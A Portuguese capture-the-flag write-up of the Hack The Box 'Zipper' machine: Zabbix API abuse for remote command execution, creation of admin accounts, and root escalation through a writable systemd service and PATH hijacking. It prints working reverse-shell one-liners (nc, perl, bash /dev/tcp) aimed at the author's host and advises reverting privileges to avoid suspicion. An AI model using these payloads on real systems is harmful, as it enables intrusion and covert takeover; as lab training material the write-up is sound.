---
title: "Hack The Box - Zipper"
tags: [Linux,Hard,Web,Burpsuite,Gobuster]
categories: HackTheBox OSWE
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/159>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta (Não vou rodar essa flag pq teve uma saída bem bizarra)

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Porta 22 - Servidor SSH

> Porta 80 - Servidor Web

## Enumeração da Porta 80

Por se tratar de um servidor web, a primeira coisa que fazemos é acessar ele pelo navegador. Verificamos que é a página padrão do apache

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_web.png)

Então rodaremos o Gobuster pra ver se encontramos mais algo

`gobuster dir -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gobuster.png)

Opa, encontramos um diretório de interesse, o `/zabbix`

### Acessando /zabbix

Então vamos acessar ele pra ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_web1.png)

O que é zabbix?

`O Zabbix é uma ferramenta de software de monitoramento de código aberto para diversos componentes de TI, incluindo redes, servidores, máquinas virtuais e serviços em nuvem. O Zabbix fornece métricas de monitoramento, entre outras, utilização da rede, carga da CPU e consumo de espaço em disco.`

Resumindo, um servidor de monitoramento

Bom uma vez que não temos senha (ainda), vamos clicar em `Sign in as Guest` pra ver se coseguimos acessar a platarforma e ver se temos alguma informação interessante que podemos utilizar nessa exploração

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_web2.png)

Damos uma olhada pela página e encontramos algo de interessante dentro da aba `Monitoring` e `Latest Data`, encontramos dois possíveis usuários, o `Zipper` e o `Zabbix`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_web3.png)

#### Tentativa de login com zipper

Bom, sabendo que temos dois usuários, podemos começar a tentar logar na aplicação, "adivinhamos" que a senha do zapper é zapper mesmo por que ele não deu Password Incorrect, e sim GUI is Disabled, ou seja, sabemos a senha, mas ele não tem acesso ao painel

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_web4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_web5.png)

# Interagindo com a API

Lendo na internet, verificamos que temos acesso a API da aplicação, e podemos retirar informações importantes dela (https://www.zabbix.com/documentation/3.0/manual/api/reference)

Uma delas é de como é feita a interação com a aplicação, é através de uma requsição POST para /zabbix/api_jsonrpc.php e com o Content-Type: application/json-rpc

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_api.png)

Podemos fazer isso pelo curl e pelo BurpSuite, eu pessoalmente prefiro o BurpSuite pelo fato de eles ser mais "amigável" para o usuário comum

## Logando pela API

Primeiro passo logicamente é testar o `user.login`, ou seja, conseguimos logar na API

Mandamos a requisição da API para o BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp.png)

Recebemos no BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp1.png)

Trocamos para POST

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp2.png)

Mandamos para o Repeater e alteramos conforme está na documentação

> https://www.zabbix.com/documentation/3.0/manual/api/reference/user/login

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp3.png)

E ao enviarmos, obtemos a resposta igual está na documentação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp4.png)

## Verificando usuários

Podemos verificar quais são os hosts que estão sendo "controlados" pelo Zabbix

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp5.png)

Aqui estão, temos duas, a zabbix e a zipper, possivelmente essa zipper é nosso alvo, até pelo fato de esse ser o nome da máquina

```
{
    "jsonrpc": "2.0",
    "method": "host.get",
    "params": {
        "output": [
            "hostid",
            "host"
        ],
        "selectInterfaces": [
            "interfaceid",
            "ip"
        ]
    },
    "id": 2,
    "auth": "44972cf4b17a4ebffabb9b31faa378f6"
}
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp6.png)

Agora vamos explorar essa API de modo a ganhar um shell na máquina alvo, vou demonstrar dirversos métodos em que podemos fazer isso

O host de interesse é o que tem o `ID 10106`

# Explorando Zabbix - 1º Execução de script pela API

> https://www.zabbix.com/documentation/3.0/manual/api/reference/script/get

A referência está aqui

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp7.png)

Então testamos e vemos que está igual ao site de referência `script.get`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp8.png)

Para que funcione corretamente devemos passar algums parâmetros, e colocar ao invés do `script.get` tem que ser `script.create` pois vamos criar um comando para ser executado

"command": "ping -c1 10.10.16.126" - o comando a ser executado

"name": "teste" - qualquer coisa

"execute_on": 0 - aqui quer dizer onde vai ser executado o script, se não colocarmos nada, será 1, ou seja, no zabbix server, não quero que seja ali, pois vai cair em um container (aqui é importante) deve ser colocado pra cair no cliente, que não é o container

Então setamos as opções

`{"jsonrpc":"2.0", "method":"script.create", "id":1, "auth":"44972cf4b17a4ebffabb9b31faa378f6", "params":{"command": "ping -c1 10.10.16.126", "name": "teste", "execute_on": 0}}`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp9.png)

Bom, a princípio for criado, podemos verificar se realmente foi criado

`{"jsonrpc": "2.0","method": "script.get","params": {"output": "extend"},"auth": "44972cf4b17a4ebffabb9b31faa378f6","id": 1}`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp10.png)

Agora com o `script.execute` podemos executar o comando criado

`{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"44972cf4b17a4ebffabb9b31faa378f6", "params":{"hostid": 10106, "scriptid": 5}}`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp11.png)

Temos RCE!

Agora criamos outro script com o reverse shell pra nossa máquina

`{"jsonrpc":"2.0", "method":"script.create", "id":1, "auth":"44972cf4b17a4ebffabb9b31faa378f6", "params":{"command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.126 443 >/tmp/f", "name": "shell", "execute_on": 0}}`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp12.png)

Executamos ele e ganhamos a shell

`{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"44972cf4b17a4ebffabb9b31faa378f6", "params":{"hostid": 10106, "scriptid": 6}}`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp13.png)

Só que a conexão cai um segundo depois que é estabelecido o shell

## Pegando um shell estável

Então temos que fazer um jeito do shell ser estável e não cair. O que vou fazer? Colocar em um arquivo um shell, e jogar ele para o nc na porta 443, quando o servidor cehgar na minha porta 443, vai executar esse shell e me dar outro shell na porta 444

shell
`perl -e 'use Socket;$i="10.10.16.126";$p=444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp14.png)

Ai está, um shell estável

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_burp15.png)

# Explorando Zabbix - 2º Shell como Zabbix (exploitdb)

Bom, agora vamos fazer de outro modo, atráves do exploit do searchsploit

Logo depois que clicamos em `Sign as Guest` na parte inferior verificamos a versão do Zabbix

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit.png)

Procuramos por exploits para essa versão

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit2.png)

Encontramos esse que nos chamou atenção por ser Remote Command Execution, exatamente o que queremos. Copiamos ele para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit3.png)

Alteramos oq precisa ser alterado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit4.png)

Executamos, e conseguimos um "shell" na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit6.png)

Estamos claramente em um container, (dica do 0xdf), se realizarmos outro nmap com full scan, vamos verificar a porta 10050 aberta no servidor, contudo não conseguimos interagir com ela na Kali, mas por esse container nós conseguimos

`echo "system.run[hostname | nc 10.10.16.126 443]" | nc 10.10.10.108 10050`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit7.png)

## Pegando um shell "estável"

Bom, agora vamos pegar um shell "estável", a técnica é a mesma do que foi anteriormente

`echo "system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.126 443 >/tmp/f]" | nc 10.10.10.108 10050`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit9.png)

Ou poderiamos ter feito direto também

`bash -c 'bash -i >& /dev/tcp/10.10.16.126/443 0>&1'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit8.png)

Beleza, vamos prosseguir então

## Enumerando o servidor

Dando uma olhada nas pastas pra ver se encotramos algo de útil, nos deparamos com o arquivo de configuração do zabbix

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit10.png)

Encontramos a senha dele!

`DBPassword=f.YMeMd$pTbpY3-449`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit11.png)

## Verificando senha do Admin

Uma vez que temos a senha do mysql dele, vamos nos conectar e ver o que podemos extrair dali

`mysql -u zabbix -D zabbixdb -p`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit12.png)

Encontramos alguns hashs

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit13.png)

`Admin  | Administrator | 65e730e044402ef2e2f386a18ec03c72`

Verificamos que a senha do admin é a mesma do zabbixdb

`echo -n "f.YMeMd\$pTbpY3-449" | md5sum`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit14.png)

## Logando na aplicação

Bom, uma vez que temos um login e senha de Admin no zabbix, vamos logar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit15.png)

Show, conseguimos logar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit16.png)

Agora com acesso ao painel de administrador ficou relativamente fácil de conseguirmos um shell, uma vez que podemos adicionar/remover diretamente no painel os scripts que será executados pelo servidor

# Explorando Zabbix - 3º Shell Zipper - Admin Scripts

Bom, uma vez logado, agora vamos pegar um shell dessa máquina, vamos em `Administrator` - `Scritps`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit17.png)

Clicamos em `Creat Script`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit18.png)

Agora criamos ele para nos dar um reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit19.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit20.png)

Agora vamos em `Monitoring` e `Latest Data`, ai clicamos em `Hosts - Select` e adicionamos os dois `Hosts`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit21.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit22.png)

Bom, ai clicamos em `Filter` e vai aparecer todos os scripts

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit23.png)

Clicamos no `Zipper` uma vez que eu sei que é o que eu quero executar, e irá aparecer os scrips

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit24.png)

Clicamos no `Shell` e eu recebo um reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_exploit25.png)

# Explorando Zabbix - 4º Trocando usuários pela API

Outro modo que temos para conseguir acesso a essa máquina é trocarmos os privilégios dos usuários na máquina através da API dele, aqui vamos fazer pelo CURL ao invés do BurpSuite como foi feito antes, pra poder demonstrar/praticar os dois modos

Podemos fazer diversas coisas, lendo a documentação da API (sempre é bom ler documentação, é boa prática)

--> Habilitar GUI para zapper

--> Adicionar um usuário "visitante" ao grupo dos Admins

--> Criar um novo usuário de Admin

## Habilitando GUI para Zapper

Bom, a primeira coisa que vamos fazer é habilitar a GUI para o usuário Zapper

Com a chamada `usergroup.net` posso verificar quais grupos que o usuário zapper possui

(https://www.zabbix.com/documentation/3.0/manual/api/reference/usergroup/get)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui.png)

Primeiro, devemos logar na API

`curl http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.login", "id":1, "auth":null, "params":{"user": "zapper", "password": "zapper"}}'`

`{"jsonrpc":"2.0","result":"9a0b26fc2cb0b22221d40ef13b486734","id":1}`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui1.png)

Então fazemos a requisição pra verificar quais grupos que o zipper está

`curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"usergroup.get", "id":1, "auth":"9a0b26fc2cb0b22221d40ef13b486734", "params":{"userids": "3"}}' | jq '.'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui2.png)

Podemos verificar que o *Frontend* está desabilitado para esse usuário, ali no `gui_access:2`, então vamos alterar isso

`curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"usergroup.update", "id":1, "auth":"9a0b26fc2cb0b22221d40ef13b486734", "params":{"usrgrpid": "12", "gui_access": "0"}}' | jq -c '.'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui3.png)

Agora verificamos novamente e vemos que foi alterado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui4.png)

## Acessando GUI Zapper

Agora entramos no painel de usuário do zapper

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui5.png)

Bom agora podemos fazer o que foi feito anteriormente

# Explorando Zabbix - 5º Transformando o Guest em Super Admin

Acessamos como Guest

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui11.png)

Quando acessamos o painel de Guest, verificamos que ele é bem menor em comparação ao do usuário, mas podemos trocar as permissões dele e tornar esse usuário administrador. Sim, isso mesmo, se olharmos nas propriedades do `user.object` da API (https://www.zabbix.com/documentation/3.0/manual/api/reference/user/object)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui7.png)

## Tornando Guest um Super Admin

Bom, uma vez que eu sei qual é o valor do super admin, agora ficou "fácil" trocar o do zapper. Com o `user.update` (https://www.zabbix.com/documentation/3.0/manual/api/reference/user/update) posso alterar o valor dele

`curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.update", "id":1, "auth":"9a0b26fc2cb0b22221d40ef13b486734", "params":{"userid": "2", "type": "3"}}' | jq -c '.'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui8.png)

Ao acessarmos agora o painel como Guest vemos que temos muito mais opções

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui9.png)

Quando fizer o que tem que ser feito, podemos voltar os privilégios para não levantar suspeitas

`curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.update", "id":1, "auth":"9a0b26fc2cb0b22221d40ef13b486734", "params":{"userid": "2", "type": "1"}}' | jq -c '.'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui10.png)

# Explorando Zabbix - 6º Criando um Admin User

Sim, isso mesmo podemos também criar um usuário com os privilégios de administrador direto da API. Utilizando da função `user.create` (https://www.zabbix.com/documentation/3.0/manual/api/reference/user/create)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui12.png)

Vou fazer do mesmo modo que está na documentação, criar o type = 3, que é super admin, colocar passwd e adicionar ao grupo 7, que é o grupo dos admins

`curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.create", "id":1, "auth":"9a0b26fc2cb0b22221d40ef13b486734", "params":{"passwd": "shell_api", "usrgrps": [{"usrgrpid": "7"}], "alias": "shell_api", "type": "3"}}' | jq -c '.'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui13.png)

Login e senha são *shell_api*, agora logamos no site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui14.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_gui15.png)

Bom, a partir daqui você já sabe o que fazer

# Escalação de Privilégio de Zabbix -> Zapper

Com o shell de zabber, pode ver a flag user.txt, mas ainda não podemos acessar ela. Começcamos a verificar os arquivos pelo servidor em busca de algo que nos seja útil

Encontramos um arquivo chamado `backup.sh` que se mostrou promissor, por tem uma senha nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_zabbix.png)

Então testamos a senha com o `su zapper` e conseguimos login de zipper

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_zabbix1.png)

Vimos que é um script que roda a cada 30 min, mas não conseguimos explorar nada por ele. O que temos de interessante é a chave ssh do usuário, que vamos usar caso a conexão caia e para ter um shell melhor também

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_zabbix2.png)

# Escalação de Privilégio de Zapper -> Root

Vamos iniciar a escalação de privilégio nessa máquina, para isso rodamos o linpeas nela (é uma boa prática, mas da pra encontrar os pontos de escalação de privilégio sem utilização de scripts)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_lin.png)

> https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_lin1.png)

Baixamos ele para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_lin2.png)

Passamos ele para a máquina Zipper

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_lin3.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_lin4.png)

Encontramos vários pontos indicando nossa escalação de privilégio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_lin5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_lin6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_lin7.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_lin8.png)

Bom, ai está. Vamos fazer de dois modos, pelo SUID do binário ali e pelo script de backup que está sendo executado na máquina

## 1º Modo - purgebackups

O primeiro modo que iremos fazer será através desse purgebackups do sistema. É sabido que todos os serviços estão definidos em `/etc/systemd/system` e quase todos são links simbólicos para `/lib/systemd/system`. Mas podemos verificar dentro da pasta quais não são links simbólicos, e temos que o nosso amigo purge-backups.service não é um deles, e ainda por cima podemos escrever nele!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_priv.png)

Então vamos ver como é o funcionamento dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_priv1.png)

Veficicamos duas coisa importantes, a primeira delas é o `ExecStart` que é o script que ele está executando, a segunda coisa é o `WantedBy` que sinaliza o nome do arquivo que será criado como o serviço dentro da pasta `/etc/systemd/system` (https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files)

Vamos olhar agora o arquivo do timer

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_priv2.png)

o `After` indica que o serviço será iniciado após a execução do zabbix-agent.server. O serviço vai se executar 15 segundos após o boot e quando ativo a cada 5 minutos. E está atrelado ao zabbix-service dentro da pasta home do usuário

### Explorando o purgebackups

Bom, sabendo que o serviço é executado como root, e temos permissão de escrever nos arquivos dele, ficou fácil para explorarmos, poderíamos fazer de centenas de modo essa exploração, a que eu vou fazer é habilitar o Bit SUID do dash, e após isso virar root

Vamos criar o arquivo que transforma o dash no /dev/shm

root.sh
```
#!/bin/bash
chmod 4755 /bin/dash
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_priv3.png)

Pronto, agora vamos modificar no `/etc/systemd/system/purge-backups.service` o arquivo a ser executado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_priv4.png)

Agora é só reiniciar o serviço ou esperar 5 min e verificar que o dash está com o SUID Bit habilitado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_priv5.png)

Outra maneira de explorar fazer ele executar um script que me da um reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_priv6.png)

Esperar o tempo, ou reiniciar o serviço e ganhar a shell de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_priv7.png)

## 2º Modo - zabbix-server binário com SUID habilitado

Outro modo de se explorar essa máquina é pelo suid habilitado do binário zabbix-service, realmente é um serviço estranho estar com o suid habilitado e perigoso. Pra verificarmos o que podemos fazer o primeiro passo é rodar o `ltrace` pra ver quais chamadas estão sendo feitas pelo binários

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_suid.png)

Opa, de cara verificamos que ele executa uma chamada de system para `system("systemctl daemon-reload && syste"`, ou seja, podemos modificar o PATH dele e fazer ele executar o nosso "systemctl". Isso já foi feito em outras máquinas aqui, não envolve muito conhecimento

Vamos verificar com o `strings` como é essa chamada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_suid1.png)

Vamos criar o nosso `systemctl` com um sh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_suid2.png)

Agora alteramos o `PATH` do sistema, para primeiro procurar os binários nessa pasta, e ele vai encontrar o systemctl ali e executar ele

```
echo $PATH
export OLD=$PATH
export PATH=/home/zapper/utils
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_suid3.png)

E me dar shell de root, mas devemos alterar o PATH, voltando para o original, pq senão ele não vai encontrar os binários

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_suid4.png)

Pronto!

### Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-zipper/Z_root.png)